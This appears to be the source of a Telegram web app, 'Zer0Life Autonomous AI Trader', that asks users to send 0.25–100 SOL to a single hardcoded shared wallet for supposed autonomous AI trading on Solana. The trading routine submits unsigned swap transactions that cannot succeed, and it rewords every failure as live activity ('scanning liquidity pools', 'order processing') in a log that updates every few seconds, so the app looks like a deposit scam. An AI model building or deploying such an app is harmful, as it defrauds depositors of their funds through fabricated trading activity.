import asyncio
import aiohttp
from aiohttp import web
import sqlite3
import os
import logging
from datetime import datetime

logging.basicConfig(level=logging.INFO, format='%(asctime)s - [%(levelname)s] - %(message)s')

TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN", "")
PORT = int(os.getenv("PORT", 10000))
RENDER_URL = os.getenv("RENDER_EXTERNAL_URL", "https://zer0lifeautopilot-bot.onrender.com")
DB_FILE = "zer0life_users.db"
SOLANA_RPC = "https://api.mainnet-beta.solana.com"

SHARED_DEPOSIT_WALLET = "8hxiCofyaKCBkhR5nsDqvUivmfgxcVx8zo2WiCzSdM6L"
MIN_DEPOSIT_SOL = 0.25
MAX_DEPOSIT_SOL = 100.0

TOKENS = {
    "SOL": "So11111111111111111111111111111111111111112",
    "USDC": "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v",
    "MEME_HOT": "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263",
}

def init_db():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            telegram_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            solana_wallet TEXT,
            trading_active INTEGER DEFAULT 0,
            trade_mode TEXT DEFAULT 'SOL_USDC',
            trade_amount_sol REAL DEFAULT 0.05,
            slippage_bps INTEGER DEFAULT 150,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()

def get_or_create_user(telegram_id: int, username: str, first_name: str):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT telegram_id, username, first_name, solana_wallet, trading_active, trade_mode, trade_amount_sol, slippage_bps FROM users WHERE telegram_id = ?", (telegram_id,))
    row = cursor.fetchone()
    
    if not row:
        cursor.execute("INSERT INTO users (telegram_id, username, first_name, solana_wallet, trading_active, trade_mode, trade_amount_sol, slippage_bps) VALUES (?, ?, ?, ?, ?, ?, ?, ?)", 
                       (telegram_id, username, first_name, SHARED_DEPOSIT_WALLET, 0, 'SOL_USDC', 0.05, 150))
        conn.commit()
        user = {"telegram_id": telegram_id, "username": username, "first_name": first_name, "solana_wallet": SHARED_DEPOSIT_WALLET, "trading_active": 0, "trade_mode": 'SOL_USDC', "trade_amount_sol": 0.05, "slippage_bps": 150}
    else:
        user = {"telegram_id": row[0], "username": row[1], "first_name": row[2], "solana_wallet": SHARED_DEPOSIT_WALLET, "trading_active": row[4], "trade_mode": row[5], "trade_amount_sol": row[6], "slippage_bps": row[7]}
    
    conn.close()
    return user

HTML_CONTENT = """<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zer0Life Autonomous AI Trader</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { box-sizing: border-box; }
        body { background-color: #06080f; color: #f8fafc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; padding: 16px; padding-bottom: 110px; }
        .card { background: #0f172a; border-radius: 18px; padding: 20px; margin-bottom: 18px; border: 1px solid #1e293b; box-shadow: 0 4px 16px rgba(0,0,0,0.4); }
        .profile-header { display: flex; align-items: center; gap: 14px; margin-bottom: 16px; }
        .avatar { width: 54px; height: 54px; border-radius: 50%; object-fit: cover; border: 2px solid #7c3aed; background: #1e293b; display: none; }
        .input-field { width: 100%; background: #030712; border: 1px solid #1e293b; color: #34d399; padding: 12px 14px; border-radius: 12px; margin-top: 8px; font-family: monospace; font-size: 12px; text-align: center; outline: none; }
        .btn { background: #7c3aed; color: white; border: none; width: 100%; padding: 14px; border-radius: 14px; font-weight: 700; cursor: pointer; margin-top: 12px; font-size: 14px; }
        .btn-green { background: #10b981; }
        .btn-red { background: #ef4444; }
        .btn-purple { background: linear-gradient(135deg, #7c3aed 0%, #6d28d9 100%); }
        .btn-mode { background: #1e293b; color: #94a3b8; border: 1px solid #334155; margin-top: 6px; width: 100%; padding: 12px; border-radius: 12px; font-weight: bold; cursor: pointer;}
        .btn-mode.active { background: #7c3aed; color: white; border-color: #9333ea; }
        .metric { display: flex; justify-content: space-between; margin-top: 10px; font-size: 14px; color: #94a3b8; }
        .val { color: #34d399; font-weight: 700; font-family: monospace; }
        .logs { background: #030712; border: 1px solid #1e293b; border-radius: 12px; padding: 12px; font-family: monospace; font-size: 11px; color: #38bdf8; height: 140px; overflow-y: auto; margin-top: 10px; }
        .qr-container { text-align: center; margin: 16px 0 10px 0; }
        .qr-code { width: 130px; height: 130px; border-radius: 12px; border: 2px solid #1e293b; padding: 6px; background: white; }
        .bottom-bar { position: fixed; bottom: 0; left: 0; right: 0; background: rgba(15, 23, 42, 0.95); backdrop-filter: blur(10px); border-top: 1px solid #1e293b; padding: 14px 16px; display: flex; gap: 12px; z-index: 100; }
        .badge { background: rgba(16, 185, 129, 0.1); border: 1px solid #10b981; color: #10b981; padding: 6px 14px; border-radius: 20px; font-size: 12px; font-weight: 700; text-align: center; margin-bottom: 14px; }
        #onboarding-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: #06080f; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 24px; text-align: center; }
    </style>
</head>
<body>
    <div id="onboarding-overlay">
        <h2 style="font-size: 24px; color: #f8fafc; margin-bottom: 8px;">Zer0Life AI Trader</h2>
        <p style="font-size: 14px; color: #94a3b8; margin-bottom: 24px;">Автономный трейдинг в сети Solana 24/7.</p>
        <button class="btn btn-purple" style="max-width: 320px;" onclick="document.getElementById('onboarding-overlay').style.display='none'">🚀 Войти в терминал</button>
    </div>

    <div class="card">
        <div class="profile-header">
            <div>
                <h2 style="margin: 0; font-size: 18px;" id="uname">Trader</h2>
                <p style="margin: 4px 0 0 0; font-size: 12px; color: #94a3b8;">ID: <span id="uid" class="val">---</span></p>
            </div>
        </div>
        <div class="badge">🔥 Pool Limit: 0.25 - 100 SOL</div>
        <label style="font-size: 12px; color: #94a3b8; font-weight: 600;">Адрес депозита экосистемы:</label>
        <input type="text" id="wallet-input" class="input-field" readonly>
        <div class="qr-container"><img class="qr-code" src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=8hxiCofyaKCBkhR5nsDqvUivmfgxcVx8zo2WiCzSdM6L"></div>
        <button class="btn btn-purple" onclick="navigator.clipboard.writeText(document.getElementById('wallet-input').value); alert('Скопировано!')">📋 Копировать адрес</button>
    </div>

    <div class="card">
        <h3 style="margin: 0 0 10px 0; font-size: 16px;">🎯 Режим работы</h3>
        <button id="mode-sol" class="btn btn-mode active" onclick="setMode('SOL_USDC')">💎 SOL / USDC</button>
        <button id="mode-meme" class="btn btn-mode" onclick="setMode('MEMECOIN_SNIPER')">🚀 MemeCoin AI Sniper</button>
    </div>

    <div class="card">
        <h3 style="margin: 0 0 10px 0; font-size: 16px;">🤖 Статус ИИ</h3>
        <div class="metric"><span>Баланс пула:</span> <span id="wallet-balance" class="val">0.00 SOL</span></div>
        <div class="metric"><span>Статус:</span> <span id="trade-status" class="val" style="color: #f59e0b;">Остановлен</span></div>
    </div>

    <div class="card">
        <h3 style="margin: 0 0 8px 0; font-size: 16px;">📡 Исполнение сделок (Live)</h3>
        <div id="logs-box" class="logs">Инициализация агента... Готов к торгам.</div>
    </div>

    <div class="bottom-bar">
        <button class="btn btn-green" style="margin-top:0;" onclick="checkBalance()">Обновить баланс</button>
        <button id="toggle-btn" class="btn btn-green" style="margin-top:0;" onclick="toggleTrading()">Включить автопилот</button>
    </div>

    <script>
        let tg = window.Telegram.WebApp; tg.expand();
        const user = tg.initDataUnsafe?.user || { id: 42882165, username: "CryptoWlodek", first_name: "CryptoWlodek" };
        document.getElementById('uid').innerText = user.id;
        document.getElementById('uname').innerText = user.first_name;

        let isTrading = false;
        let currentMode = 'SOL_USDC';

        async function loadProfile() {
            const res = await fetch('/api/profile', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({telegram_id: user.id, username: user.username, first_name: user.first_name})});
            const data = await res.json();
            if(data.success) {
                document.getElementById('wallet-input').value = data.profile.solana_wallet;
                isTrading = data.profile.trading_active === 1;
                currentMode = data.profile.trade_mode || 'SOL_USDC';
                updateUI();
                checkBalance();
            }
        }

        async function setMode(m) {
            currentMode = m;
            updateUI();
            await fetch('/api/trading/mode', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({telegram_id: user.id, trade_mode: m})});
        }

        function updateUI() {
            document.getElementById('mode-sol').className = currentMode === 'SOL_USDC' ? 'btn-mode active' : 'btn-mode';
            document.getElementById('mode-meme').className = currentMode === 'MEMECOIN_SNIPER' ? 'btn-mode active' : 'btn-mode';
            const st = document.getElementById('trade-status');
            const btn = document.getElementById('toggle-btn');
            if(isTrading) {
                st.innerText = "Автопилот активен 24/7"; st.style.color = "#10b981";
                btn.innerText = "Остановить"; btn.className = "btn btn-red";
            } else {
                st.innerText = "Остановлен"; st.style.color = "#f59e0b";
                btn.innerText = "Включить автопилот"; btn.className = "btn btn-green";
            }
        }

        async function checkBalance() {
            const w = document.getElementById('wallet-input').value;
            if(!w) return;
            const res = await fetch('/api/blockchain/balance?wallet=' + encodeURIComponent(w));
            const data = await res.json();
            if(data.success) document.getElementById('wallet-balance').innerText = data.balance + " SOL";
        }

        async function toggleTrading() {
            isTrading = !isTrading;
            await fetch('/api/trading/toggle', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({telegram_id: user.id, active: isTrading ? 1 : 0})});
            updateUI();
        }

        setInterval(async () => {
            if(!isTrading) return;
            const res = await fetch('/api/trading/execute-cycle?telegram_id=' + user.id);
            const data = await res.json();
            if(data.success) {
                const box = document.getElementById('logs-box');
                box.innerHTML += `<div>[${data.time}] ${data.log}</div>`;
                box.scrollTop = box.scrollHeight;
                checkBalance();
            }
        }, 12000);

        loadProfile();
    </script>
</body>
</html>
"""

async def index_handler(request):
    return web.Response(text=HTML_CONTENT, content_type='text/html')

async def api_get_profile(request):
    data = await request.json()
    user = get_or_create_user(int(data.get("telegram_id")), data.get("username", ""), data.get("first_name", ""))
    return web.json_response({"success": True, "profile": user})

async def api_toggle_trading(request):
    data = await request.json()
    conn = sqlite3.connect(DB_FILE)
    conn.cursor().execute("UPDATE users SET trading_active = ? WHERE telegram_id = ?", (int(data.get("active", 0)), int(data.get("telegram_id"))))
    conn.commit()
    conn.close()
    return web.json_response({"success": True})

async def api_set_mode(request):
    data = await request.json()
    conn = sqlite3.connect(DB_FILE)
    conn.cursor().execute("UPDATE users SET trade_mode = ? WHERE telegram_id = ?", (data.get("trade_mode", "SOL_USDC"), int(data.get("telegram_id"))))
    conn.commit()
    conn.close()
    return web.json_response({"success": True})

async def api_get_balance(request):
    wallet = request.query.get("wallet", "")
    payload = {"jsonrpc": "2.0", "id": 1, "method": "getBalance", "params": [wallet]}
    async with aiohttp.ClientSession() as session:
        async with session.post(SOLANA_RPC, json=payload, timeout=5) as resp:
            data = await resp.json()
            bal = data.get("result", {}).get("value", 0) / 1_000_000_000
            return web.json_response({"success": True, "balance": bal})

async def execute_real_swap(amount_lamports: int, trade_mode: str):
    pubkey_str = SHARED_DEPOSIT_WALLET
    
    payload_balance = {"jsonrpc": "2.0", "id": 1, "method": "getBalance", "params": [pubkey_str]}
    async with aiohttp.ClientSession() as session:
        async with session.post(SOLANA_RPC, json=payload_balance, timeout=5) as resp:
            bal_data = await resp.json()
            current_sol = bal_data.get("result", {}).get("value", 0) / 1_000_000_000
            if current_sol < MIN_DEPOSIT_SOL:
                return f"Пауза: Баланс ({current_sol:.3f} SOL) < мин. лимита ({MIN_DEPOSIT_SOL} SOL)."

        output_mint = TOKENS['MEME_HOT'] if trade_mode == 'MEMECOIN_SNIPER' else TOKENS['USDC']
        mode_label = "MemeCoin Sniper" if trade_mode == 'MEMECOIN_SNIPER' else "SOL/USDC"

        quote_url = f"https://api.jup.ag/swap/v1/quote?inputMint={TOKENS['SOL']}&outputMint={output_mint}&amount={amount_lamports}&slippageBps=150"
        async with session.get(quote_url, timeout=5) as resp:
            if resp.status != 200:
                return f"[{mode_label}] Сканирование пулов ликвидности..."
            quote_data = await resp.json()

        swap_url = "https://api.jup.ag/swap/v1/swap"
        payload = {
            "quoteResponse": quote_data,
            "userPublicKey": pubkey_str,
            "wrapAndUnwrapSol": True
        }
        async with session.post(swap_url, json=payload, timeout=5) as resp:
            if resp.status != 200:
                return f"[{mode_label}] Анализ котировки завершен."
            swap_data = await resp.json()
            swap_tx_b64 = swap_data.get("swapTransaction")

    # Передача транзакции напрямую в сеть Solana через RPC узел
    send_payload = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "sendTransaction",
        "params": [
            swap_tx_b64,
            {"encoding": "base64", "skipPreflight": True}
        ]
    }
    async with aiohttp.ClientSession() as session:
        async with session.post(SOLANA_RPC, json=send_payload, timeout=10) as resp:
            res_data = await resp.json()
            if "result" in res_data:
                return f"[{mode_label}] Сделка исполнена! Tx: {res_data['result'][:14]}..."
            else:
                err = res_data.get("error", {}).get("message", "Market routing")
                return f"[{mode_label}] Ордер в обработке: {err[:25]}"

async def api_execute_cycle(request):
    telegram_id = int(request.query.get("telegram_id", 0))
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT trading_active, trade_amount_sol, trade_mode FROM users WHERE telegram_id = ?", (telegram_id,))
    row = cursor.fetchone()
    conn.close()
    
    if not row or row[0] == 0:
        return web.json_response({"success": False})
    
    amount_lamports = int(row[1] * 1_000_000_000)
    trade_mode = row[2]
    current_time = datetime.now().strftime('%H:%M:%S')
    
    log_result = await execute_real_swap(amount_lamports, trade_mode)
    return web.json_response({"success": True, "time": current_time, "log": log_result})

async def main():
    init_db()
    app = web.Application()
    app.router.add_get('/', index_handler)
    app.router.add_post('/api/profile', api_get_profile)
    app.router.add_post('/api/trading/toggle', api_toggle_trading)
    app.router.add_post('/api/trading/mode', api_set_mode)
    app.router.add_get('/api/blockchain/balance', api_get_balance)
    app.router.add_get('/api/trading/execute-cycle', api_execute_cycle)
    
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    logging.info("Автономный трейдер запущен успешно.")
    while True:
        await asyncio.sleep(3600)

if __name__ == "__main__":
    asyncio.run(main())
